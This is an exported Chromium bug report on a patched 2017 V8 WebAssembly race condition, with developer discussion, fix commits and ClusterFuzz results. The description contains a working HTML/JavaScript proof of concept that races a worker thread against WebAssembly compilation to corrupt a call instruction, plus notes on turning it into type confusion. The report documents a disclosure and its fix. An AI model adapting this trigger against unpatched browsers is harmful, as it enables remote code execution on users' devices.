# V8 type confusion in Web Assembly [

| Field | Value |
|-------|-------|
| **Issue ID** | [40088842](https://issues.chromium.org/issues/40088842) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Reporter** | in...@chromium.org |
| **Assignee** | ti...@chromium.org |
| **Created** | 2017-08-28 |
| **Bounty** | $7,500.00 |

## Description

From https://b.corp.google.com/issues/64796825
Part of chrome remote exploit for pixel.

1. The RCE Bug
By combining the three fetures(WebAssembly, Web worker and SharedArrayBuffer) in chrome, an OOB access can be triggered through race condition. Simply speaking, WebAssembly code can be put into a SharedArrayBuffer, and then transfer to a webworker. When the main thread parses the WebAssembly Code, the worker thread can modify the code at the same time, which cause an OOB access, a short PoC is as follows:

<html>
<h1>poc</h1>
<script id="worker1">
worker:{
    if (typeof window === 'object') break worker; // Bail if we're not a Worker
    self.onmessage = function(arg) {
        //%DebugPrint(arg.data);
        console.log("worker started");
        var ta = new Uint8Array(arg.data);
        //%DebugPrint(ta.buffer);
        var i =0;
        while(1){
            if(i==0){
                i=1;
                ta[51]=0;                               //--------------------->4)modify the webassembly code at the same time
            }else{
                i=0;
                ta[51]=128;
            }
        }
    }
}
</script>

<script>
function getSharedTypedArray(){
    var wasmarr = [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
        0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b
            ];
    var sb = new SharedArrayBuffer(wasmarr.length);           //------------------> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i<sta.length;i++)
        sta[i]=wasmarr[i];
    return sta;    
}
var blob = new Blob([
        document.querySelector('#worker1').textContent
        ], { type: "text/javascript" })

var worker = new Worker(window.URL.createObjectURL(blob));   //-------------------->2)create a web worker
var sta = getSharedTypedArray();
//%DebugPrint(sta.buffer);
worker.postMessage(sta.buffer);                              //-------------------->3)pass the WebAssembly code to the web worker


setTimeout(function(){
        while(1){
        try{
        //console.log(sta[50]);
        sta[51]=0;
        var myModule = new WebAssembly.Module(sta);          //--------------------->4)parse the webassembly code
        var myInstance = new WebAssembly.Instance(myModule);
        //myInstance.exports.getAnswerPlus1();
        }catch(e){
        ///console.log(e)
        }
        }
    },1000);

//worker.terminate(); 
</script>
</html>

I think the buggy code is in the following function
https://chromium.googlesource.com/v8/v8.git/+/07259a9ceafa078c9bb7f9ee1bb6f2d67256cc80/src/wasm/wasm-js.cc#69
i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo<v8::Value>& args, ErrorThrower* thrower) {
  ......
  } else if (source->IsTypedArray()) {    ------------------->source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local<TypedArray> array = Local<TypedArray>::Cast(source);
    Local<ArrayBuffer> buffer = array->Buffer();
    ArrayBuffer::Contents contents = buffer->GetContents();
    start =
        reinterpret_cast<const byte*>(contents.Data()) + array->ByteOffset();
    length = array->ByteLength();
  } 
  ......
  return i::wasm::ModuleWireBytes(start, start + length);
}

The exploit of this bug is easy, we can simply modify "call xxx" webassembly instruction to leak stack contents and  cause type confusion, 
for example, we can dump the aforementioned webassembly code by wasm-objdump.
ggong@ggong-pc:~$ wasm-objdump -d test.wasm




test.wasm:      file format wasm 0x1

Code Disassembly:

00002b func[0]:
 00002d: 41 2a                      | i32.const 42
 00002f: 0b                         | end
000030 func[1]:
 000032: 10 00                      | call 0                  -------------> the aforementioned worker thread modified this call intstructrion to call 128 and cause a OOB access 
 000034: 41 01                      | i32.const 1
 000036: 6a                         | i32.add
 000037: 0b                         | end
As to the detail, please refer to the full exploit.

## Timeline

### jo...@chromium.org (2017-08-28)

[Empty comment from Monorail migration]

### rs...@chromium.org (2017-08-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2017-08-28)

Should be OS-All i think.

### cl...@chromium.org (2017-08-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5938693553782784.

### aw...@google.com (2017-08-28)

[Empty comment from Monorail migration]

### ti...@chromium.org (2017-08-28)

The WebAssembly engine should make a copy of the underlying array buffer contents to guard against concurrent modification.

This was not an issue with synchronous compilation, but became an issue when we added asynchronous compilation.

### ti...@chromium.org (2017-08-28)

We should make a copy of the underlying bytes of the array buffer, even for synchronous compiles.

### ha...@chromium.org (2017-08-28)

[Empty comment from Monorail migration]

### ti...@chromium.org (2017-08-28)

[Empty comment from Monorail migration]

### ti...@chromium.org (2017-08-28)

Fix is in CQ: https://chromium-review.googlesource.com/c/v8/v8/+/638590

### ha...@chromium.org (2017-08-28)

[Empty comment from Monorail migration]

### ha...@chromium.org (2017-08-28)

Marking also for 62 because of impending branch cut. The fix must be on the 6.2 branch.

### bu...@chromium.org (2017-08-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/542ff03c4e50273e55e25ee647a6e54e009da4dd

commit 542ff03c4e50273e55e25ee647a6e54e009da4dd
Author: Ben L. Titzer <titzer@chromium.org>
Date: Mon Aug 28 16:50:38 2017

[wasm] Always make a copy of the wire bytes for a synchronous compile.

R=ahaas@chromium.org,mtrofin@chromium.org

Bug: chromium:759624
Change-Id: I032755698c4f404cfd5bf3298df57a4bcfbe6f2c
Reviewed-on: https://chromium-review.googlesource.com/638590
Reviewed-by: Andreas Haas <ahaas@chromium.org>
Commit-Queue: Ben Titzer <titzer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#47652}
[modify] https://crrev.com/542ff03c4e50273e55e25ee647a6e54e009da4dd/src/wasm/wasm-module.cc


### br...@chromium.org (2017-08-28)

+bbudge

### cl...@chromium.org (2017-08-28)

Detailed report: https://clusterfuzz.com/testcase?key=5938693553782784

Job Type: linux_asan_chrome_mp
Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  v8::internal::wasm::CodeSpecialization::ApplyToWasmCode
  v8::internal::wasm::CodeSpecialization::ApplyToWholeInstance
  v8::internal::wasm::InstanceBuilder::Build
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=480271:480432

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5938693553782784

See https://github.com/google/clusterfuzz-tools for more information.

### mt...@chromium.org (2017-08-28)

Creating the Merge Requests for M60 and 61, and, given the severity of the issue, going ahead with the merges, too.

### sh...@chromium.org (2017-08-28)

This bug requires manual review: We are only 7 days from stable.
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), ketakid@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mt...@chromium.org (2017-08-28)

Adding Owners as per #17


### go...@chromium.org (2017-08-28)

+hablich@ (V8 TPM) and awhalley@ (Secutity TPM).

### bu...@chromium.org (2017-08-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/acb080bc00b217d3dc85086d049c7c6f94ef57d7

commit acb080bc00b217d3dc85086d049c7c6f94ef57d7
Author: Mircea Trofin <mtrofin@chromium.org>
Date: Mon Aug 28 22:16:19 2017

Merged: [wasm] Always make a copy of the wire bytes for a synchronous compile.

Revision: 542ff03c4e50273e55e25ee647a6e54e009da4dd

BUG=chromium:759624
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=bradnelson@chromium.org

Change-Id: I48eb55218f939b6a887326d36fa8bc6f1bb75277
Reviewed-on: https://chromium-review.googlesource.com/639194
Reviewed-by: Brad Nelson <bradnelson@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.0@{#114}
Cr-Branched-From: 97dbf624a5eeffb3a8df36d24cdb2a883137385f-refs/heads/6.0.286@{#1}
Cr-Branched-From: 12e6f1cb5cd9616da7b9d4a7655c088778a6d415-refs/heads/master@{#45439}
[modify] https://crrev.com/acb080bc00b217d3dc85086d049c7c6f94ef57d7/src/wasm/wasm-module.cc


### bu...@chromium.org (2017-08-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/5b0aca522d3f25a0e612706e7cdddf526e16a59f

commit 5b0aca522d3f25a0e612706e7cdddf526e16a59f
Author: Mircea Trofin <mtrofin@chromium.org>
Date: Mon Aug 28 22:25:27 2017

Merged: [wasm] Always make a copy of the wire bytes for a synchronous compile.

Revision: 542ff03c4e50273e55e25ee647a6e54e009da4dd

BUG=chromium:759624
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=bradnelson@chromium.org

Change-Id: I2843caf8f9641a91861d64fb46c37c107d07da0d
Reviewed-on: https://chromium-review.googlesource.com/639338
Reviewed-by: Brad Nelson <bradnelson@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.1@{#64}
Cr-Branched-From: 1bf2e10ddb194d4c2871a87a4732613419de892d-refs/heads/6.1.534@{#1}
Cr-Branched-From: e825c4318eb2065ffdf9044aa6a5278635c36427-refs/heads/master@{#46746}
[modify] https://crrev.com/5b0aca522d3f25a0e612706e7cdddf526e16a59f/src/wasm/wasm-module.cc


### cl...@chromium.org (2017-08-29)

ClusterFuzz has detected this issue as fixed in range 497860:497926.

Detailed report: https://clusterfuzz.com/testcase?key=5938693553782784

Job Type: linux_asan_chrome_mp
Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  v8::internal::wasm::CodeSpecialization::ApplyToWasmCode
  v8::internal::wasm::CodeSpecialization::ApplyToWholeInstance
  v8::internal::wasm::InstanceBuilder::Build
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=480271:480432
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=497860:497926

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5938693553782784

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### ti...@chromium.org (2017-08-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2017-08-29)

ClusterFuzz testcase 5938693553782784 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-08-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-08-29)

[Empty comment from Monorail migration]

### aw...@google.com (2017-08-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-08-30)

[Empty comment from Monorail migration]

### go...@chromium.org (2017-08-30)

Removing "Merge-Review-61" label as it was already merged to M61 at https://crbug.com/chromium/759624#c21.

### aw...@google.com (2017-08-31)

[Empty comment from Monorail migration]

### aw...@google.com (2017-09-05)

[Empty comment from Monorail migration]

### aw...@google.com (2017-09-05)

[Empty comment from Monorail migration]

### ha...@chromium.org (2017-09-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-09-06)

[Empty comment from Monorail migration]

### aw...@google.com (2017-09-18)

[Comment Deleted]

### aw...@chromium.org (2017-09-18)

[Empty comment from Monorail migration]

### aw...@google.com (2017-10-09)

[Comment Deleted]

### of...@google.com (2017-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-10-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/759624?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088842)*
